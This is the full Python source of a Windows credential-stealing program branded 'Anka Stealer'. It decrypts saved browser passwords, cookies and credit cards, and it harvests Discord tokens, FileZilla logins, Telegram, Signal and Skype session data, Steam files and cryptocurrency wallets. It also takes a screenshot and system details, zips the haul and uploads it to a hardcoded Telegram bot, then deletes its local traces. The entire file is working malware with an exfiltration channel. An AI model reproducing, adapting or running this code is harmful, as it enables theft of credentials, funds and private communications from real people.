import os, re, shutil, json, platform, ctypes, getpass, psutil, time, base64, sys
import xml.etree.ElementTree as ET
from threading import Thread as ttt
from zipfile import ZipFile
import requests
import win32crypt
import sqlite3
from Crypto.Cipher import AES
import mss
import winreg
from pathlib import Path

APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
TEMP = os.getenv('TEMP')
os.chdir(TEMP)
sc = mss.mss()

banner = '''
 ▄▄▄·  ▐ ▄ ▄ •▄  ▄▄▄·     .▄▄ · ▄▄▄▄▄▄▄▄ . ▄▄▄· ▄▄▌  ▄▄▄ .▄▄▄  
▐█ ▀█ •█▌▐██▌▄▌▪▐█ ▀█     ▐█ ▀. •██  ▀▄.▀·▐█ ▀█ ██•  ▀▄.▀·▀▄ █·
▄█▀▀█ ▐█▐▐▌▐▀▀▄·▄█▀▀█     ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▄█▀▀█ ██▪  ▐▀▀▪▄▐▀▀▄ 
▐█ ▪▐▌██▐█▌▐█.█▌▐█ ▪▐▌    ▐█▄▪▐█ ▐█▌·▐█▄▄▌▐█ ▪▐▌▐█▌▐▌▐█▄▄▌▐█•█▌
 ▀  ▀ ▀▀ █▪·▀  ▀ ▀  ▀      ▀▀▀▀  ▀▀▀  ▀▀▀  ▀  ▀ .▀▀▀  ▀▀▀ .▀  ▀
'''

def cutcc(lst):
    ret = []
    al = []
    for el in lst:
        if el in al:
            continue
        al.append(el)
        ret.append(el)
    return ret
       
npaths = {"Chromium": "\\Chromium\\User Data\\","Chrome": "\\Google\\Chrome\\User Data\\","Opera GX": "\\Opera Software\\Opera GX Stable\\","Chrome(x86)": "\\Google(x86)\\Chrome\\User Data\\","Opera": "\\Opera Software\\Opera Stable\\","ChromePlus": "\\MapleStudio\\ChromePlus\\User Data\\","Iridium": "\\Iridium\\User Data\\","7Star": "\\7Star\\7Star\\User Data\\","CentBrowser": "\\CentBrowser\\User Data\\","Chedot": "\\Chedot\\User Data\\","Vivaldi": "\\Vivaldi\\User Data\\","Kometa": "\\Kometa\\User Data\\","Elements Browser": "\\Elements Browser\\User Data\\","Epic Privacy Browser": "\\Epic Privacy Browser\\User Data\\","Uran": "\\uCozMedia\\Uran\\User Data\\","ChromiumViewer": "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\","Citrio": "\\CatalinaGroup\\Citrio\\User Data\\","Coowon": "\\Coowon\\Coowon\\User Data\\","liebao": "\\liebao\\User Data\\","QIP Surf": "\\QIP Surf\\User Data\\","Orbitum": "\\Orbitum\\User Data\\","Comodo Dragon": "\\Comodo\\Dragon\\User Data\\","Amigo": "\\Amigo\\User\\User Data\\","Torch": "\\Torch\\User Data\\","Yandex": "\\Yandex\\YandexBrowser\\User Data\\","Comodo": "\\Comodo\\User Data\\","360Browser": "\\360Browser\\Browser\\User Data\\","Maxthon3": "\\Maxthon3\\User Data\\","K-Melon": "\\K-Melon\\User Data\\","Sputnik": "\\Sputnik\\Sputnik\\User Data\\","Nichrome": "\\Nichrome\\User Data\\","CocCoc": "\\CocCoc\\Browser\\User Data\\","Uran": "\\Uran\\User Data\\","Chromodo": "\\Chromodo\\User Data\\","Atom": "\\Mail.Ru\\Atom\\User Data\\","Brave": "\\BraveSoftware\\Brave-Browser\\User Data\\"}

tpaths = []
dpaths = [APPDATA + "\\Discord\\", APPDATA + "\\Lightcord\\", APPDATA + "\\discordptb\\", APPDATA + "\\discordcanary\\",APPDATA + "\\Opera Software\\Opera Stable\\", APPDATA + "\\Opera Software\\Opera GX Stable\\",LOCALAPPDATA + "\\Amigo\\User Data\\", LOCALAPPDATA + "\\Torch\\User Data\\", LOCALAPPDATA + "\\Kometa\\User Data\\",LOCALAPPDATA + "\\Orbitum\\User Data\\", LOCALAPPDATA + "\\CentBrowser\\User Data\\", LOCALAPPDATA + "\\7Star\\7Star\\User Data\\",LOCALAPPDATA + "\\Sputnik\\Sputnik\\User Data\\", LOCALAPPDATA + "\\Vivaldi\\User Data\\Default\\",LOCALAPPDATA + "\\Google\\Chrome SxS\\User Data\\", LOCALAPPDATA + "\\Epic Privacy Browser\\User Data\\",LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\", LOCALAPPDATA + "\\uCozMedia\\Uran\\User Data\\Default\\",LOCALAPPDATA + "\\Microsoft\\Edge\\User Data\\Default\\", LOCALAPPDATA + "\\Yandex\\YandexBrowser\\User Data\\Default\\",LOCALAPPDATA + "\\Opera Software\\Opera Neon\\User Data\\Default\\",LOCALAPPDATA + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"]

domaindetect = ["cryptonator.com", "payeer.com", "lolz.guru", "wwh-club.net", "xss.is", "bhf.io", "btc.com", "minergate.com", "blockchain.com", "github.com", "coinbase.com","paypal.com","qiwi.com", "qiwi.ru", "minecraft.net", "mojang.com", "yougame.biz", "youtube.com", "nixware.net", "discord.com", "discordapp.com", "discord.gg"]
paths = []
wallets = [["Zcash", APPDATA + "\\Zcash"],["Armory", APPDATA + "\\Armory"],["Bytecoin", APPDATA + "\\bytecoin"],["Jaxx", APPDATA + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"],["Exodus", APPDATA + "\\Exodus\\exodus.wallet"],["Ethereum", APPDATA + "\\Ethereum\\keystore"],["Electrum", APPDATA + "\\Electrum\\wallets"],["AtomicWallet", APPDATA + "\\atomic\\Local Storage\\leveldb"],["Guarda", APPDATA + "\\Guarda\\Local Storage\\leveldb"],["Coinomi", LOCALAPPDATA + "\\Coinomi\\Coinomi\\wallets"],["Edge_Auvitas",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"],["Edge_Math",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"],["Edge_Metamask",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"],["Edge_MTV",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"],["Edge_Rabet",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"],["Edge_Ronin",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"],["Edge_Yoroi",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"],["Edge_Zilpay",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"],["Edge_Exodus",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"],["Edge_Terra_Station",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"],["Edge_Jaxx",LOCALAPPDATA +"\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"],["Chrome_Binance",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"],["Chrome_Bitapp",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"],["Chrome_Coin98",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"],["Chrome_Equal",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"],["Chrome_Guild",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"],["Chrome_Iconex",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"],["Chrome_Math",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"],["Chrome_Mobox",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"],["Chrome_Phantom",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"],["Chrome_Tron",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"],["Chrome_XinPay",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"],["Chrome_Ton",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"],["Chrome_Metamask",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"],["Chrome_Sollet",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"],["Chrome_Slope",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"],["Chrome_Starcoin",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"],["Chrome_Swash",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"],["Chrome_Finnie",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"],["Chrome_Keplr",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"],["Chrome_Crocobit",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"],["Chrome_Oxygen",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"],["Chrome_Nifty",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"],["Chrome_Liquality",LOCALAPPDATA +"\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"]]
allaf = []
otstuk = {'cookies': 0, 'passwords': 0, 'history': 0, 'autofills': 0, 'cards': 0, 'tokens': 0, 'filezilla': 0, 'wallets': 0}

for p in npaths.items():
    p = list(p)
    ad = f'{APPDATA}{p[1]}'
    lad = f'{LOCALAPPDATA}{p[1]}'
    if os.path.exists(ad):
        tpaths.append(ad)

    if os.path.exists(lad):
        tpaths.append(lad)
       
for bname, bpath in npaths.items():  
    for x in tpaths:
        if bpath in x:
            paths.append((bname, x))

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    if not os.path.exists(path): return tokens

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens

def steelTokens():
    gtl = []

    for path in dpaths:
        if not os.path.exists(path):
            continue

        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                gtl.append(token)

    return cutcc(gtl)

def get_master_key(path):
    try:
        with open(path, "r", encoding='utf-8') as f: local_state = json.loads(f.read())

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key
    except: pass

def decrypt_payload(cipher, payload): 
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv): 
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except: 
        return 'Error'

def getPasswords(db, localstate):
    ret = []
    mkey = get_master_key(localstate)
    shutil.copy2(db, "temp.db")
    conn = sqlite3.connect("temp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")

    try:
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, mkey)
    
            if username != "" or decrypted_password != "": 
                ret.append((url, username, decrypted_password))
    except:
        pass

    try: 
        os.remove('temp.db')
    except: 
        pass

    return ret

def getCC(db, localstate):
    master_key = get_master_key(localstate)
    shutil.copy2(db, "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()
    ret = []

    try:
        cursor.execute("SELECT * FROM credit_cards")

        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            ret.append((decrypted_password, f'{str(expire_mon)}/{str(expire_year)}', username))
    except: 
        pass

    cursor.close()
    conn.close()

    try: 
        os.remove("CCvault.db")
    except: 
        pass

    return ret

def getCookies(db, localstate):
    decrypted_key = get_master_key(localstate)
    shutil.copy2(db, "Cooks.db")
    ret = []
    conn = sqlite3.connect('Cooks.db')
    conn.text_factory = bytes
    cursor = conn.cursor()

    try:
        cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')

        for host_key, name, value, encrypted_value in cursor.fetchall():
            try:
                cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3 + 12])
                decrypted_value = cipher.decrypt_and_verify(encrypted_value[3 + 12:-16], encrypted_value[-16:])
    
                try: 
                    decrypted_value = decrypted_value.decode('utf8')
                except: 
                    pass
            except: 
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or 0
    
            ret.append((host_key.decode('utf8'), name.decode('utf8'), decrypted_value))
    except:
        pass

    try: 
        os.remove("Cooks.db")
    except: 
        pass
 
    return ret
   
def getAutofill(path):
    shutil.copy2(path, "Bebra.db")
    conn = sqlite3.connect("Bebra.db")
    cursor = conn.cursor()
    ret = []

    try:
        cursor.execute("SELECT * FROM autofill")

        for r in cursor.fetchall(): 
            ret.append((r[0], r[1], r[5]))
    except: 
        pass

    cursor.close()
    conn.close()

    try: 
        os.remove("Bebra.db")
    except: 
        pass

    return ret
   
def getHistory(path):
    shutil.copy2(path, "Hist.db")
    conn = sqlite3.connect("Hist.db")
    cursor = conn.cursor()
    ret = []

    try:
        cursor.execute("SELECT id, url FROM urls")

        for r in cursor.fetchall(): 
            ret.append((r[0], r[1]))

    except: 
        pass

    cursor.close()
    conn.close()
    ret.sort(key=lambda x: -x[0])

    try: 
        os.remove("Hist.db")
    except: 
        pass

    return ret
   
def gtt(s, k):
    try: 
        return [x for x in s if x.tag == k][0].text
    except: 
        return '-'
   
def steelFileZilla():
    tree = ET.parse(r'ROAMING\FileZilla\recentservers.xml'.replace('ROAMING', APPDATA))
    servers = []
    root = tree.getroot()

    for server in root[0]:
        host = gtt(server, 'Host')
        user = gtt(server, 'User')
        p = gtt(server, 'Pass') or '-'
        p = base64.b64decode(p.encode()).decode()
        servers.append((host, user, p))

    return servers
   
def getBssid():
    try:
        import subprocess as sp
        res = sp.check_output('netsh wlan show interfaces')
        return [x for x in res.split(b'\n') if b'BSSID' in x][0].decode().strip().strip('BSSID: ')
    except: return '?'
       
def processes():
    import psutil
    p = []

    for pr in psutil.process_iter():
        try: 
            p.append((pr.pid, pr.name(), "CMD: " + " ".join(pr.cmdline()) if len(pr.cmdline()) != 0 else 'NOCMD'))
        except: 
            pass

    return p
   
def software():
    try:
        s = ''

        def foo(hive, flag):
            aReg = winreg.ConnectRegistry(None, hive)
            aKey = winreg.OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 0, winreg.KEY_READ | flag)

            count_subkey = winreg.QueryInfoKey(aKey)[0]
            software_list = []

            for i in range(count_subkey):
                software = {}

                try:
                    asubkey_name = winreg.EnumKey(aKey, i)
                    asubkey = winreg.OpenKey(aKey, asubkey_name)
                    software['name'] = winreg.QueryValueEx(asubkey, "DisplayName")[0]

                    try: 
                        software['version'] = winreg.QueryValueEx(asubkey, "DisplayVersion")[0]
                    except EnvironmentError: 
                        software['version'] = 'undefined'
                    try: 
                        software['publisher'] = winreg.QueryValueEx(asubkey, "Publisher")[0]
                    except EnvironmentError: 
                        software['publisher'] = 'undefined'

                    software_list.append(software)
                except EnvironmentError: 
                    continue

            return software_list

        software_list = foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + foo(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + foo(winreg.HKEY_CURRENT_USER, 0)

        return software_list
    except: 
        return []

def stealsteam():
    try:
        basepath = 'C:/'
        file_steam = 'Steam.exe'
        hack_folder_steam = 'config'
        hack_file_steam = ['config.vdf', 'loginusers.vdf', 'DialogConfig.vdf', 'filterlist.vdf']
        parth_name_steam = 'ssfn'
        folder_write_steam = 'Gaming\\Steam'
        exit = False
    
        walk = os.walk(basepath)
        for dirpath, dirnames, files in walk:
            for file_name in files:
                if file_name == file_steam:
                    path = dirpath + '\\' + hack_folder_steam
                    path2 = dirpath
                    os.makedirs(folder_write_steam)
                    for name in hack_file_steam: shutil.copyfile(path + '\\' + name, folder_write_steam + name)
                    with os.scandir(path2) as it:
                        for entry in it:
                            if (entry.is_file()) and (parth_name_steam in entry.name): 
                                shutil.copyfile(path2 + '\\' + entry.name, folder_write_steam + entry.name)
    except: 
        pass

def stealtdata():
    try:
        basepath = 'C:/'
        folder_telegram = 'Telegram Desktop'
        hack_name = 'D877'
        hack_file = 'map'
        folder_write = 'Messangers\\Telegram'
        
        walk = os.walk(basepath)
        for dirpath, dirnames, files in walk:
            for folder_name in dirnames:
                if folder_name == folder_telegram:
                    path = dirpath + '\\' + folder_telegram + '\\tdata'
                    with os.scandir(path) as it:
                        for entry in it:
                            if (entry.is_dir()) and (hack_name in entry.name):
                                path_write = folder_write + '\\' + entry.name
                                os.makedirs(path_write)
                                with os.scandir(path + '\\' + entry.name) as it2:
                                    for i in it2:
                                        if hack_file in i.name: 
                                            shutil.copyfile(path + '\\' + entry.name + '\\' + i.name, path_write + '\\' + i.name)
                            if (entry.is_file()) and (hack_name in entry.name): 
                                shutil.copyfile(path + '\\' + entry.name, folder_write + '\\' + entry.name)
    except: 
        pass

def stealelement():
    try:
        target = APPDATA + '\\Element\\Local Storage\\leveldb'
        folder_write = 'Messangers\\Element\\leveldb'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)

            shutil.copyfile(target, folder_write)
    except: 
        pass

def stealicq():
    try:
        target = APPDATA + '\\Icq\\0001'
        folder_write = 'Messangers\\Icq\\0001'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)

            shutil.copyfile(target, folder_write)
    except: 
        pass

def stealsignal():
    try:
        target = APPDATA + '\\Signal'
        targets = [target + '\\databases', target + '\\Session Storage', target + '\\Local Storage', target + '\\sql', target + '\\config.json']
        folder_write = 'Messangers\\Signal'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)
    
            for _ in targets:
                a = Path(_)
    
                if a.is_file():
                    shutil.copyfile(_, 'Messangers\\'+_.replace(APPDATA,''))
                else:
                    shutil.copytree(_, 'Messangers\\'+_.replace(APPDATA,''))
    except: 
        pass

def stealskype():
    try:
        target = APPDATA + '\\Microsoft\\Skype for Desktop\\Local Storage'
        folder_write = 'Messangers\\Skype\\Local Storage'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)

            shutil.copytree(target, folder_write)
    except: 
        pass

def stealtox():
    try:
        target = APPDATA + '\\Tox'
        folder_write = 'Messangers\\Tox'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)

            shutil.copytree(target, folder_write)
    except: 
        pass

def stealuplay():
    try:
        target = LOCALAPPDATA + '\\Ubisoft Game Launcher'
        folder_write = 'Gaming\\Ubisoft Game Launcher'

        if os.path.exists(target):
            if not os.path.exists(folder_write):
                os.makedirs(folder_write)

            shutil.copytree(target, folder_write)
    except: 
        pass

def stealwallets():
    try:
        folder_write = 'Wallets'

        if not os.path.exists(folder_write):
            os.makedirs(folder_write)

        for _ in wallets:
            a = Path(_[1])

            if os.path.exists(a):
                if a.is_file():
                    shutil.copyfile(a, 'Wallets\\' + _[1].replace(APPDATA, '').replace(LOCALAPPDATA, ''))
                else:
                    shutil.copytree(a, 'Wallets\\' + _[1].replace(APPDATA, '').replace(LOCALAPPDATA, ''))
    except: 
        pass

def cookieThread():
    global otstuk

    for name, path in paths:
        db = path + 'default\\Cookies' if "chrome" not in name.lower() else path + 'default\\Network\\Cookies'
        ls = path + 'Local State'

        try: 
            cook = getCookies(db, ls)
        except: 
            continue

        if len(cook) == 0: 
            continue

        otstuk['cookies'] += len(cook)
 
        with open(name+'-cook.txt', 'w+', encoding='utf8') as w: 
            w.write(banner+'\n'.join(f'{x[0]}\tTRUE\t/\tFALSE\t3376684800\t{x[1]}\t{x[2]}' for x in cook))

    try: 
        os.remove('Cooks.db')
    except: 
        pass
       
def passwordThread():
    global otstuk
    passwords = []

    for name, path in paths:
        db = path + 'default\\Login Data'
        ls = path + 'Local State'

        try: 
            pwd = getPasswords(db, ls)
        except: 
            continue

        for p in pwd:
            otstuk['passwords'] += 1
            passwords.append((name, p[0], p[1], p[2]))

    if len(passwords) == 0: 
        return

    with open('Passwords.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n===============\n'.join([f'URL: {x[1]}\nUsername: {x[2]}\nPassword: {x[3]}\nApplication: {x[0]}' for x in passwords]))

    try: 
        os.remove('temp.db')
    except: 
        pass
   
def autofillThread():
    global allaf, otstuk

    for name, path in paths:
        db = path + 'default\\Web Data'

        try: 
            afs = getAutofill(db)
        except: 
            continue

        if len(afs) == 0: 
            continue

        for a in afs:
            allaf.append(a)
            otstuk['autofills'] += 1

        with open(name+'-afs.txt', 'w+', encoding='utf8') as w: 
            w.write(banner+'\n===============\n'.join(f'Name: {x[0]}\nValue: {x[1]}' for x in afs))

    try: 
        os.remove('Bebra.db')
    except: 
        pass
       
def historyThread():
    global otstuk

    for name, path in paths:
        db = path + 'default\\History'

        try: 
            his = getHistory(db)
        except: 
            continue

        if len(his) == 0: 
            continue

        otstuk['history'] += len(his[:500])

        with open(name+'-his.txt', 'w+', encoding='utf8') as w: 
            w.write(banner+'\n'.join(f'{x[1]}' for x in his[:500]))

    try: 
        os.remove('Hist.db')
    except: 
        pass
       
def cardsThread():
    global otstuk
    cards = []

    for name, path in paths:
        db = path + 'default\\Web Data'
        ls = path + 'Local State'

        try: 
            cc = getCC(db, ls)
        except: 
            continue

        for c in cc:
            cards.append((name, c[0], c[1], c[2]))
            otstuk['cards'] += 1

    if len(cards) == 0: 
        return
 
    with open('Cards.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n===============\n'.join([f'Number: {x[1]}\nDate: {x[2]}\nCardholder: {x[3]}\nApplication: {x[0]}' for x in cards]))

    try: 
        os.remove('temp.db')
    except: 
        pass
   
sname = ''

def screenThread():
    global sname

    try: 
        sname = sc.shot()
    except: 
        pass

def fzThread():
    global otstuk

    try: 
        fz = steelFileZilla()
    except: 
        pass
    else:
        if len(fz) > 0:
            otstuk['filezilla'] += len(fz)
 
            with open('FileZilla.txt', 'w+', encoding='utf8') as w: 
                w.write(banner+'\n===============\n'.join([f'Host: {x[0]}\nUsername: {x[1]}\nPassword: {x[2]}' for x in fz]))
               
def tokensThread():
    global otstuk
    tokens = steelTokens()
    toks = []

    for token in tokens:
        h = {'Authorization': token}
        try: 
            r = requests.get('https://discord.com/api/users/@me/guilds', headers=h)
        except: 
            continue

        if r.status_code == 200: 
            toks.append(token)

        elif r.status_code == 403: 
            toks.append(f'[Phonelocked] {token}')

    if len(toks) == 0: 
        return

    otstuk['tokens'] += len(toks)
 
    with open('Tokens.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n'.join(toks))
   
def infoThread():
    global user, node, country, ip, windows, desks, process_list, proc, soft, keyb
    uname = platform.uname()
    windows = f'{uname.system} {uname.release}({uname.version})'
    node = uname.node
    user = getpass.getuser()
    proc = uname.processor
    desks = []
    ipj = requests.get('http://ip-api.com/json/').json()
    ip = ipj['query']
    country = ipj['countryCode']
    partitions = psutil.disk_partitions()
    def get_size(bytes, suffix="B"):
        factor = 1024

        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor: 
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor
       
    for partition in partitions:
        try: 
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except:
            total = '? GB'
            percent = '?'
        else:
            total = get_size(partition_usage.total)
            percent = partition_usage.percent
        desks.append(f'{partition.mountpoint} - {total} | {partition.fstype} | {percent}% used')
    process_list = processes()

    with open('ProcessList.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n'.join([f'PID: {x[0]} | {x[1]} | {x[2]}' for x in process_list]))

    soft = software()

    with open('SoftwareList.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n'.join([f'{i+1}) {x["name"]}[{x["version"]}]' for i, x in enumerate(soft)]) if len(soft) != 0 else 'Какие-то арабские фокусы, софта нет')

    with open('UserInformation.txt', 'w+', encoding='utf8') as w: 
        n = '\n'
        w.write(f'''{banner}
IP: {ip}
Username: {user}
Country: {country}
OS: {windows}
Processor: {proc}
Processes: {len(process_list)}
Installed programs: {len(soft)}

Hard drives:
{n.join(desks)}
''')

def sessionsThread():
    try: 
        stealtdata()
    except: 
        pass

def steamThread():
    try: 
        stealsteam()
    except: 
        pass

def elementThread():
    try: 
        stealelement()
    except: 
        pass

def signalThread():
    try: 
        stealsignal()
    except: 
        pass

def skypeThread():
    try: 
        stealskype()
    except: 
        pass

def icqThread():
    try: 
        stealicq()
    except: 
        pass

def toxThread():
    try: 
        stealtox()
    except: 
        pass

def uplayThread():
    try: 
        stealuplay()
    except: 
        pass

def walletsThread():
    try: 
        stealwallets()
    except: 
        pass

funcs = [cookieThread,passwordThread,autofillThread,screenThread,cardsThread,fzThread,tokensThread,infoThread,historyThread,sessionsThread,steamThread,elementThread,signalThread,skypeThread,icqThread,toxThread,uplayThread,walletsThread]
tasks = []

for f in funcs:
    task = ttt(target=f)
    tasks.append(task)
    task.start()

while True in [t.is_alive() for t in tasks]:
    time.sleep(0.01)

ls = os.listdir()

def domainDetector():
    detected = []
    for file in ls:
        if file.endswith('.txt'):
            with open(file, encoding='utf8') as f: contents = f.read()
            for domain in domaindetect:
                if domain in contents: 
                    detected.append(domain)
    detected = cutcc(detected)

    with open('DomainDetects.txt', 'w+', encoding='utf8') as w: 
        w.write(banner+'\n'.join(detected))
       
domainDetector()

logname = f'{node}.{user}[{country}].zip'
zipp = ZipFile(logname, 'w')

todelete = []

for file in ls:
    if '-cook' in file:
        zipp.write(file, f'Browsers/Cookies/{file.replace("-cook", "")}')
    elif '-afs' in file:
        zipp.write(file, f'Browsers/Autofills/{file.replace("-afs", "")}')
    elif '-his' in file:
        zipp.write(file, f'Browsers/History/{file.replace("-his", "")}')
    elif file in ['Passwords.txt', 'Cards.txt', 'FileZilla.txt', 'DomainDetects.txt']:
        zipp.write(file)
    elif file == 'Tokens.txt':
        zipp.write(file, 'Messangers/Discord/Tokens.txt')
    elif file in ['UserInformation.txt', 'ProcessList.txt', 'SoftwareList.txt']:
        zipp.write(file, f'Information/{file}')
    elif file == sname:
        zipp.write(file, 'Screenshot.'+file.split('.')[-1])
    elif file == 'Messangers':
        for dirpath,dirs,files in os.walk('Messangers'):
            for f in files:
                fn = os.path.join(dirpath, f)
                zipp.write(fn)
    elif file == 'Gaming':
        for dirpath,dirs,files in os.walk('Gaming'):
            for f in files:
                fn = os.path.join(dirpath, f)
                zipp.write(fn)
    elif file == 'Wallets':
        for dirpath,dirs,files in os.walk('Wallets'):
            for f in files:
                fn = os.path.join(dirpath, f)
                zipp.write(fn)
    else:
        continue

    todelete.append(file)

zipp.comment = banner.encode()
zipp.close()

otstuk.update({'ip': ip, 'country': country, 'user': user, 'node': node, 'windows': windows, 'soft': len(soft), 'process': len(process_list), 'processor': proc})

otstuk1 = '💎 *NEW Report!*'

for k, v in otstuk.items():
    otstuk1 += '\n└ *' + k.capitalize() + ':* `' + str(v) + '`'

requests.post('https://api.telegram.org/bot5425303083:AAGy-gE5umPwAco3M4OU18fpbjLp9f97Z8o/sendDocument?chat_id=1188331478&caption='+str(otstuk1)+'&parse_mode=markdown', files={'document': (logname,open(logname,'rb'))})

for x in todelete:
    a = Path(x)

    if a.is_file():
        os.remove(a)

    else:
        shutil.rmtree(a)

os.remove(logname)